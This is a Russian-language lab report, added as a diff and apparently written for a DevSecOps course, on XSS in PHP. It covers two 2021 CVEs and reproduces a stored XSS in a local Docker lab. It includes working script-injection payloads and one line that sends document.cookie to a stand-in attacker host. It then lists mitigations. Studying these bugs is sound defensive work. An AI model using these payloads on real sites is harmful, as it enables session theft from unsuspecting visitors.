@@ -1,0 +1,62 @@
+<p>Часть I</p>
+<p>На NVD и stack.watch нашел статистику CVE за 2021 год и XSS в PHP-компонентах</p>
+<p>По данным stack.watch за 2021 год опубликовано 21 115 CVE. Это рекорд на тот момент, на ~16% больше чем в 2020 (18 150). Вывод простой: даже XSS встречается в этом списке десятками раз - разработчики продолжают наступать на одни и те же грабли</p>
+<p>Первая CVE - CVE-2021-43698 в библиотеке phpWhois. Это PHP-библиотека для WHOIS-запросов: дергает WHOIS-серверы по доменам, IP, AS, парсит сырой ответ в структурированный массив (даты регистрации, контакты, NS, статус домена), кеширует результаты. Используется в админках хостеров, сервисах проверки доменов и мониторинге истечения регистрации.</p>
+<p>Сама уязвимость живет в example.php - демонстрационный файл, который многие копируют в продакшн как есть. Параметр $_GET[&#39;query&#39;] улетает в exit() без htmlspecialchars</p>
+<pre><code>exit(&quot;Error processing query: &quot; . $_GET[&#39;query&#39;]);
+</code></pre>
+<p>Payload:</p>
+<pre><code>http://victim/phpwhois/example.php?query=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p>Тип - Reflected XSS.</p>
+<p>Вторая CVE - CVE-2021-47912 в PHP Melody 3.0. Это коммерческая Video CMS, через неё делают фейк YouTube: загрузка видео и импорт с YouTube/Vimeo/Dailymotion, регистрация юзеров, каналы, подписки, категории, теги, плейлисты, поиск, админка с модерацией и статистикой, монетизация</p>
+<p>CVE-2021-47912 - несколько reflected XSS в categories.php, import.php, user_import.php. GET-параметры вставляются в HTML без санитизации</p>
+<pre><code>$category = $_GET[&#39;category&#39;];
+echo &quot;&lt;h1&gt;Category: &quot; . $category . &quot;&lt;/h1&gt;&quot;;
+</code></pre>
+<p>Из 21 115 CVE за 2021 год значительная доля - именно XSS в PHP-компонентах. Причина одна и та же: прямой вывод $_GET/$_POST в HTML без htmlspecialchars(), копирование уязвимого кода из example.php в продакшн, отсутствие auto-escape в шаблонах</p>
+<p>Часть II</p>
+<p>Для начала поднял контейнер командами из задания:</p>
+<pre><code>docker pull ket9/otus-devsecops-xss
+docker run -d -p 8081:80 ket9/otus-devsecops-xss:latest
+</code></pre>
+<p>Зашел на <a href="http://localhost:8081/">http://localhost:8081/</a>. На главной два пункта: XSS-1 и index.php. Открыл XSS-1 - там форма с одним textarea (name=comment) и кнопкой Save Data, POST на index.php. Под формой блок «Comments» - то место, куда падают отправленные комментарии</p>
+<p>Сначала отправил обычный test123, чтобы понять что происходит</p>
+<pre><code>POST /XSS-1/index.php
+comment=test123&amp;submit=Save Data
+</code></pre>
+<p>В ответе:</p>
+<pre><code>&lt;h2&gt;Comments&lt;/h2&gt;&lt;p&gt;test123
+</code></pre>
+<p>Отправил еще одно сообщение - старый test123 остался на месте, новое добавилось ниже через <hr />. Значит комментарии сохраняются на сервере и показываются всем подряд. Это уже не reflected, это Stored XSS
+Дальше проверил экранирование. Отправил <b>hello</b> - вернулся жирный hello, теги интерпретируются. Тогда в лоб классику</p>
+<pre><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+</code></pre>
+<p>В исходнике страницы видно что вставка идет на сервере PHP echo-ом без htmlspecialchars</p>
+<pre><code>&lt;h2&gt;Comments&lt;/h2&gt;&lt;p&gt;test123
+&lt;/p&gt;&lt;hr /&gt;
+&lt;p&gt;
+&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+&lt;/p&gt;&lt;hr /&gt;
+</code></pre>
+<p>Открыл <a href="http://localhost:8081/XSS-1/">http://localhost:8081/XSS-1/</a> в браузере - выскочил alert(&quot;XSS&quot;). JS выполнился в контексте страницы, уязвимость подтверждена</p>
+<img src='images/xss_alert.png'>
+
+<p>Чтобы показать что это не безобидно, дернул куки:</p>
+<pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+</code></pre>
+<p>В реальной атаке alert заменяется на fetch(&#39;<a href="https://attacker/?c='+document.cookie">https://attacker/?c=&#39;+document.cookie</a>) сессия любого, кто откроет страницу с комментариями, утечет атакующему.</p>
+<p>Итог
+Лаба показала классический пример Stored XSS: сервер берет $_POST[&#39;comment&#39;] и через echo выкидывает его в HTML без экранирования. Любой посетитель страницы получает чужой JS в свой браузер - угон сессии, действия от имени жертвы, редирект на фишинг</p>
+<ul>
+<li>XSS
+Суть: пользовательский ввод сохраняется на сервере и отдается всем посетителям как часть HTML. CWE-79, OWASP A03:2021 Injection. Самый опасный вариант XSS - жертве не нужно кликать по специальной ссылке, достаточно открыть страницу
+как избежать:
+  1)При выводе в HTML экранировать через htmlspecialchars($comment, ENT_QUOTES | ENT_HTML5, &#39;UTF-8&#39;). В стенде стоит echo $comment - это и нужно заменить. Опасные символы которых хочу избегать: &lt; &gt; &quot; &#39; &amp; /  - все они должны превратиться в HTML-entity, чтобы не закрыть тег и не открыть атрибут.
+  2)Не доверять addslashes - от XSS он не защищает
+  3)Whitelist-валидация на входе (длина, разрешенный набор символов), blacklist обходится
+  4)Подключить Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;; object-src &#39;none&#39; без unsafe-inline - даже при дыре в экранировании браузер не выполнит inline-скрипт
+  5)Куки сессии с флагами HttpOnly; Secure; SameSite=Strict - HttpOnly закрывает доступ к куке из JS, и document.cookie ничего не вернет
+  6)Использовать шаблонизаторы с auto-escape (Twig, Blade {{ $var }}) и не отключать его
+  7)Статика: Semgrep / Psalm / PHPStan ловят сырые echo $_POST[...] на этапе CI</li>
+</ul>
